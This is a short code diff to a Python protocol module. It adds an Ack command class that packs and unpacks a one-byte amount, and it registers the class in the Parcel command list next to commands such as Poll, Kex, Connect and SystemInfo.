@@ -1,3 +1,5 @@
+# -*- coding: utf-8 -*-
+
 import struct
 import netaddr
 import re
@@ -40,6 +42,21 @@ class Poll(Command):
 
     def __repr__(self):
         return '{POLL}'
+
+class Ack(Command):
+    def __init__(self, amount=0):
+        self.amount = amount
+
+    def pack(self):
+        return chr(self.amount)
+
+    @staticmethod
+    def unpack(data):
+        return Ack(amount=ord(data[0])), 1
+
+    def __repr__(self):
+        return '{{ACK ({})}}'.format(self.amount)
+
 
 class Idle(Command):
     @staticmethod
@@ -418,7 +435,7 @@ class ParcelInvalidCommand(Exception):
 class Parcel(object):
     # Explicitly define commands. In other case make break something
     commands = [
-        Poll, Policy, Idle, Kex,
+        Poll, Ack, Policy, Idle, Kex,
         Connect, PasteLink, SystemInfo, Error, Disconnect, Exit
     ]
 
